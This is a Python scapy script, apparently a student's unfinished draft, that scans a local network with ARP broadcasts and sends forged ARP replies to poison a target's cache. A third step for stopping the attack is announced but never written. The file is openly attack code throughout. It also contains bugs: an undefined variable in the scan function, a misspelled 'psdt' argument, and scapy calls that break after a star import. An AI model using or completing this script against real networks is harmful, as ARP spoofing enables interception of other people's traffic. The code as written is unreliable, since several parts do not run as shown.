from scapy.all import *;

# This is the file for ARP poisoning. I'm not sure if it works or how to test it :)

# First is my attempt at scanning the network. I'm not sure if this work and if this is what we wanted it to do if it does work.
# Scanning network for devices, this returns (or is supposed to return) all live hosts.
def network_scan(ip):
    arp = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast / arp
    # Note that sent is the ARP request I sent, received is the ARP reply.
    packet_pairs = srp(packet, timeout=2, verbose=False)[0]
    hosts = []
    for sent, received in packet_pairs:
        hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
    return hosts

# Here is where the main parts of the ARP poisoning is supposed to happen. 
# 1. We need to be able to start the poisoning attack.
# 2. We need to be able to get a current MAC adress. 
# 3. we need to stop the attack in a proper way.

# (1.) Start the poisoning attack by sending fake ARP replies.
def poison(target_ip, poison_ip, target_mac):
    fake_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poison_ip)
    send(fake_packet, verbose=False)

# (2.) Get the MAC adress of a given IP adress
def get_mac(ip):
    # First we do the same as in network scan.
    arp = scapy.ARP(psdt=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp
    packet_pairs = srp(packet, timeout=2, verbose=False)[0]
    # Now get MAC adress if something replies
    for sent, received in packet_pairs:
        return received.hwsrc
    return None

